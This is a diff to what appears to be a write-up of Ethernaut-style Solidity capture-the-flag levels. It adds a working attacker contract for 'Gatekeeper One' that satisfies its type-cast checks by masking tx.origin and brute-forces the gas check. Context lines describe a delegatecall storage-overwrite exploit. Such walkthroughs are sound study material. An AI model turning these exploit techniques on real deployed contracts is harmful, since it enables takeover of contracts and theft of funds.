@@ -253,6 +253,37 @@ contract NaughtAttack {
 }
 ```
 
+## Gatekeeper One
+Here, we do need to:
+- use a contract to get msg.sender != tx.origin
+- cast the tx.origin to different type to complete all checks: To do so, we identify that uint32(num) == uint16(num) != uint64(num) == uint16(uint160(tx.origin))
+- find the right amount of gas: we just have to brute force to find the right amount of gas, so check `gasleft() % 8191 == 0` will pass.
+```
+contract gateKeeperOneAttacker {
+
+    constructor(address victim) {
+        // Gate one will be done automatically
+
+        // Gate three
+        uint160 originAs160 = uint160(tx.origin);
+        uint64 originAs64 = uint64(originAs160);
+
+        //// We need uint32(number) == uint16(number), so the 16 higher bits should be 0
+        uint64 finalNumber = originAs64 & 0xFFFFFFFF0000FFFF;
+        bytes8 finalBytes = bytes8(finalNumber);
+        // Gate twon we will just brute force it
+        for(uint i = 0; i < 8191; i++) {
+            try GatekeeperOne(victim).enter{gas: 100000+i}(finalBytes) {}
+            catch {}
+        }
+    }
+}
+```
+
+## Gatekeeper Two
+
+
+
 ## Preservation
 We are going to exploit delegatecall(). First, we can see that the LibraryContract does modify the first storage slot, which is the address of the library in the context of the vulnerable contract. So, we are able to modify this address to set it to an attacker contract. Our attacker contract will modify the third slot, to modify the owner address.
 
